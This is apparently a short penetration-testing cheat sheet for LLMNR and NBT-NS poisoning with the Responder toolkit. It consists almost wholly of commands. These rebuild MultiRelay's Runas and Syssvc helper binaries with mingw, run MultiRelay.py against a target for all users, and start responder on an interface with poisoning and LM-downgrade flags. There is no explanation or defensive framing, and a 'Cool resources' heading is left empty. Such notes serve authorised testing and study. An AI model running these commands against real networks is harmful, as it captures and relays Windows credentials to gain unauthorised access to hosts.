# LLMNR and NBT-NS poisonning
### Responder
1. Set up `MultiRelay.py`
   * _`rm /usr/share/responder/tools/MultiRelay/bin/Runas.exe`_ - in case it doesn't work initially
   * _`rm /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe`_ - in case it doesn't work initially
   * `x86_64-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv`
   * `x86_64-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode`
   * `python3 /usr/share/responder/tools/MultiRelay.py -t <target> -u ALL`</br>
      - where `-u ALL` -> users
2. Run `Responder`
   * `responder -I <interface> -rdwv --lm`


## Cool resources
